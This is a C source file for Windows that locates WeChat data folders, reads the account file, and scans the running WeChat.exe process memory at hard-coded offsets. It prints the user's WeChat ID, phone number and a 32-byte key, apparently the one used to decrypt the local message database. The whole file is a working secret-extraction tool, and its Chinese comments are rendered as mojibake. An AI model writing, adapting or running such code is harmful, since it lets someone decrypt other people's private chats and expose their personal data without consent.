#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ShlObj_core.h>
#include <TlHelp32.h>
#include <Psapi.h>
#pragma comment(lib, "Shlwapi.lib")
#define PROCESS_VM_READ 0x0010
#define PROCESS_QUERY_INFORMATION 0x0400
// ��UTF-8������ֽ�����ת��ΪGB2312������ַ���
char* ConvertToGB2312(const unsigned char* input, int length) {
    // ������Ҫ�Ŀ��ַ���
    int wcharNum = MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)input, length, NULL, 0);
    if (wcharNum == 0) {
        printf("MultiByteToWideChar failed with error: %d\n", GetLastError());
        return NULL;
    }

    wchar_t* wstr = (wchar_t*)malloc((wcharNum + 1) * sizeof(wchar_t));
    if (wstr == NULL) {
        printf("Memory allocation failed\n");
        return NULL;
    }

    // UTF-8ת���ַ�
    MultiByteToWideChar(CP_UTF8, 0, (LPCSTR)input, length, wstr, wcharNum);
    wstr[wcharNum] = L'\0'; // ��ӿ��ַ��ַ���������

    // ����GB2312��Ҫ���ַ���
    int charNum = WideCharToMultiByte(936, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (charNum == 0) {
        printf("WideCharToMultiByte failed with error: %d\n", GetLastError());
        free(wstr);
        return NULL;
    }

    char* gb2312 = (char*)malloc(charNum + 1);
    if (gb2312 == NULL) {
        printf("Memory allocation failed\n");
        free(wstr);
        return NULL;
    }

    // ���ַ�תGB2312
    WideCharToMultiByte(936, 0, wstr, -1, gb2312, charNum, NULL, NULL);
    gb2312[charNum] = '\0'; // ����ַ���������

    // �ͷſ��ַ��ַ������ڴ�
    free(wstr);

    return gb2312; // ����GB2312������ַ����������߸����ͷ��ڴ�
}
// �����ֽ������е�ģʽ
int FindPattern(const unsigned char* buffer, int bufferLen, const unsigned char* pattern, int patternLen) {
    for (int i = 0; i <= bufferLen - patternLen; i++) {
        int found = 1;
        for (int j = 0; j < patternLen; j++) {
            if (buffer[i + j] != pattern[j]) {
                found = 0;
                break;
            }
        }
        if (found) {
            return i;
        }
    }
    return -1;
}

// ��ȡ΢���û����ֽ�
unsigned char* GetWechatUserNameBytes(const char* wxid, const char* filePath, int* rearBytesLen) {
    FILE* file = fopen(filePath, "rb");
    if (file == NULL) {
        printf("�޷����ļ�: %s\n", filePath);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* fileBytes = (unsigned char*)malloc(fileSize);
    fread(fileBytes, 1, fileSize, file);
    fclose(file);

    int wxidLen = strlen(wxid);
    int index = FindPattern(fileBytes, fileSize, (const unsigned char*)wxid, wxidLen);
    if (index != -1) {
        *rearBytesLen = fileSize - (index + wxidLen + 6);
        unsigned char* rearBytes = (unsigned char*)malloc(*rearBytesLen);
        memcpy(rearBytes, fileBytes + index + wxidLen + 6, *rearBytesLen);

        int index_1a = -1;
        for (int i = 0; i < *rearBytesLen; i++) {
            if (rearBytes[i] == 0x1A) {
                index_1a = i;
                break;
            }
        }

        if (index_1a != -1) {
            *rearBytesLen = index_1a;
            rearBytes = (unsigned char*)realloc(rearBytes, *rearBytesLen);
        }

        char* gb2312String = ConvertToGB2312(rearBytes, *rearBytesLen);
        if (gb2312String) {
         
            printf("΢���û�����%.*s\n", *rearBytesLen, gb2312String);
        }
        
        free(fileBytes);
        return rearBytes;
    }
    else {
        printf("δ�ҵ�ָ���ַ���\n");
        free(fileBytes);
        return NULL;
    }
}

// ���ֽ�����ת��Ϊʮ�������ַ���
void BytesToHex(const unsigned char* bytes, int length, char* output) {
    for (int i = 0; i < length; i++) {
        sprintf(output + i * 2, "%02X", bytes[i]);
    }
    output[length * 2] = '\0';
}

#define NUM_BYTES 32

void GetHex(HANDLE hProcess, void* lpBaseAddress) {
    unsigned char array[8];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, lpBaseAddress, array, sizeof(array), &bytesRead)) {
        printf("1\n");
        return;
    }

    unsigned long long baseAddress2 = *((unsigned long long*)array);

    unsigned char array2[NUM_BYTES];
    if (!ReadProcessMemory(hProcess, (void*)baseAddress2, array2, sizeof(array2), &bytesRead)) {
        DWORD error = GetLastError();
        printf("2; Error Code: %lu\n", error);
        return;
    }

    char hexOutput[NUM_BYTES * 2 + 1];
    BytesToHex(array2, NUM_BYTES, hexOutput);
    printf("Key (ʮ������): %s\n", hexOutput);
}


// ����WeChat.exe���̲���ȡ�ڴ�
void run(const char* wxid, const char* filepath) {
    int rearBytesLen;
    unsigned char* UserNameBytes = GetWechatUserNameBytes(wxid, filepath, &rearBytesLen);
    if (UserNameBytes == NULL) {
        return;
    }

    // ����WeChat.exe����
    DWORD processID = 0;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("�޷���ȡ���̿���\n");
        free(UserNameBytes);
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, "WeChat.exe") == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);

    if (processID == 0) {
        printf("δ�ҵ�WeChat����\n");
        free(UserNameBytes);
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processID);
    if (hProcess == NULL) {
        printf("�޷��򿪽���\n");
        free(UserNameBytes);
        return;
    }

    // ����WeChatWin.dllģ��
    HMODULE hMods[1024];
    DWORD cbNeeded;
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(char))) {
                if (_stricmp(szModName, "WeChatWin.dll") == 0) {
                    void* moduleBaseAddress = hMods[i];
                    MODULEINFO modInfo;
                    GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo));
                    SIZE_T moduleSize = modInfo.SizeOfImage;

                    unsigned char* buffer = (unsigned char*)malloc(moduleSize);
                    SIZE_T bytesRead;
                    if (ReadProcessMemory(hProcess, moduleBaseAddress, buffer, moduleSize, &bytesRead)) {
                        int matchIndex = FindPattern(buffer, moduleSize, UserNameBytes, rearBytesLen);
                        if (matchIndex != -1) {
                            void* userNameAddress = (unsigned char*)moduleBaseAddress + matchIndex;
                            printf("�ҵ�ƥ���ֽڣ��û�����ַ: WeChatWin.dll+0x%X\n", matchIndex);

                            int weChatIDOffset = 1336;
                            int phoneNumberOffset = -192;
                            int keyOffset = 1272;

                            void* weChatIDAddress = (unsigned char*)userNameAddress + weChatIDOffset;
                            void* phoneNumberAddress = (unsigned char*)userNameAddress + phoneNumberOffset;
                            void* keyAddress = (unsigned char*)userNameAddress + keyOffset;

                            // ��ȡ΢��ID
                            unsigned char weChatIDBuffer[32];
                            if (ReadProcessMemory(hProcess, weChatIDAddress, weChatIDBuffer, sizeof(weChatIDBuffer), &bytesRead)) {
                                int nullIndex = -1;
                                for (int i = 0; i < sizeof(weChatIDBuffer); i++) {
                                    if (weChatIDBuffer[i] == 0) {
                                        nullIndex = i;
                                        break;
                                    }
                                }
                                if (nullIndex == -1) nullIndex = sizeof(weChatIDBuffer);
                                printf("΢��ID (�ı�): %.*s\n", nullIndex, weChatIDBuffer);
                            }
                            else {
                                printf("�޷���ȡ΢��ID\n");
                            }

                            // ��ȡ�ֻ���
                            unsigned char phoneNumberBuffer[32];
                            if (ReadProcessMemory(hProcess, phoneNumberAddress, phoneNumberBuffer, sizeof(phoneNumberBuffer), &bytesRead)) {
                                int nullIndex = -1;
                                for (int i = 0; i < sizeof(phoneNumberBuffer); i++) {
                                    if (phoneNumberBuffer[i] == 0) {
                                        nullIndex = i;
                                        break;
                                    }
                                }
                                if (nullIndex == -1) nullIndex = sizeof(phoneNumberBuffer);
                                printf("�ֻ��� (�ı�): %.*s\n", nullIndex, phoneNumberBuffer);
                            }
                            else {
                                printf("�޷���ȡ�ֻ���\n");
                            }

                            GetHex(hProcess, keyAddress);
                        }
                        else {
                            printf("δ�ҵ�ƥ���ֽ�\n");
                        }
                    }
                    free(buffer);
                    break;
                }
            }
        }
    }

    CloseHandle(hProcess);
    free(UserNameBytes);
}

// ��ȡ�ļ�·��
char* GetFolderPath() {
    char* folderPath = NULL;
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size) == 0) {
        printf("�޷���ȡ�û���\n");
        return NULL;
    }

    char configPath[MAX_PATH];
    snprintf(configPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Tencent\\WeChat\\All Users\\config\\3ebffe94.ini", username);

    FILE* configFile = fopen(configPath, "r");
    if (configFile) {
        char fileContent[MAX_PATH];
        fgets(fileContent, MAX_PATH, configFile);
        fclose(configFile);

        if (strcmp(fileContent, "MyDocument:") == 0) {
            SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, fileContent);
            snprintf(configPath, MAX_PATH, "%s\\WeChat Files", fileContent);
        }
        else {
            snprintf(configPath, MAX_PATH, "%s\\WeChat Files", fileContent);
        }
        folderPath = strdup(configPath);
    }
    else {
        printf("�޷����ļ� %s, ���Դ�ע����ȡ\n", configPath);

        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Tencent\\WeChat", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD pathSize = MAX_PATH;
            folderPath = (char*)malloc(MAX_PATH);
            if (RegQueryValueExA(hKey, "FileSavePath", NULL, NULL, (LPBYTE)folderPath, &pathSize) != ERROR_SUCCESS) {
                printf("�޷���ȡע������е� FileSavePath\n");
                free(folderPath);
                folderPath = NULL;
            }
            RegCloseKey(hKey);
        }
        else {
            printf("�޷���ע�����\n");
        }
    }

    return folderPath;
}

int main() {
    char* path = GetFolderPath();
    if (path) {
        printf("��·�� '%s' �²��Ұ��� 'Msg' ���ļ��е������ļ���:\n", path);

        WIN32_FIND_DATA findData;
        char searchPath[MAX_PATH];
        snprintf(searchPath, MAX_PATH, "%s\\*", path);
        HANDLE hFind = FindFirstFileA(searchPath, &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                    strcmp(findData.cFileName, ".") != 0 &&
                    strcmp(findData.cFileName, "..") != 0) {

                    char subdirectory[MAX_PATH];
                    snprintf(subdirectory, MAX_PATH, "%s\\%s", path, findData.cFileName);

                    char msgFolderPath[MAX_PATH];
                    snprintf(msgFolderPath, MAX_PATH, "%s\\Msg", subdirectory);
                    if (PathFileExistsA(msgFolderPath)) {
                        printf("�ҵ��ļ���: %s\n", findData.cFileName);
                        char accInfoPath[MAX_PATH];
                        snprintf(accInfoPath, MAX_PATH, "%s\\config\\AccInfo.dat", subdirectory);
                        run(findData.cFileName, accInfoPath);
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
        else {
            printf("ָ��·�� '%s' �����ڡ�\n", path);
        }

        free(path);
    }
    else {
        printf("δ�ܻ�ȡ·����\n");
    }

    return 0;
}
